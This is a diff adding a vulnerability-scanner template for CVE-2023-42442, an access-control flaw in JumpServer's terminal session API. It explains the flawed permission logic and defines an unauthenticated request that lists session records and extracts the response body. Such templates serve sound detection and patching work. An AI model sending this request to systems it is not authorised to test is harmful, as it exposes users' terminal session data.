@@ -1,0 +1,40 @@
+id: CVE-2023-42442
+info:
+  name: JumpServer v3.0.0 - v3.6.3 terminal session api broken access control
+  author: Esonhugh
+  severity: high
+  tags: jumpserver,unauth,access control
+  description: |
+    The api /api/v1/terminal/sessions/ permission control is broken and can be accessed anonymously. 
+    https://github.com/jumpserver/jumpserver/blob/v3.6.1/apps/terminal/api/session/session.py#L91
+    class SessionViewSet(OrgBulkModelViewSet):
+        permission_classes = [RBACPermission | IsSessionAssignee]   
+    https://github.com/jumpserver/jumpserver/blob/v3.6.1/apps/terminal/permissions.py#L10
+    class IsSessionAssignee(permissions.BasePermission):
+        def has_object_permission(self, request, view, obj):
+    class BasePermission:
+        def has_permission(self, request, view):
+            return True
+
+    SessionViewSet permission classes set to [RBACPermission | IsSessionAssignee], relation is or, so any permission matched will be allowed. IsSessionAssignee inherit from BasePermission, BasePermission default has_permission set to True，and not awared this at that time.
+
+http:
+  - method: GET
+    path:
+      - "{{BaseURL}}/api/v1/terminal/sessions/?limit=10"
+
+    matchers:
+      - type: status
+        status:
+          - 200
+      - type: word
+        condition: and
+        words:
+          - '"id"'
+          - '"user"'
+          - '"terminal"'
+    extractors:
+      - type: dsl
+        name: termianl-data
+        dsl:
+          - "body"
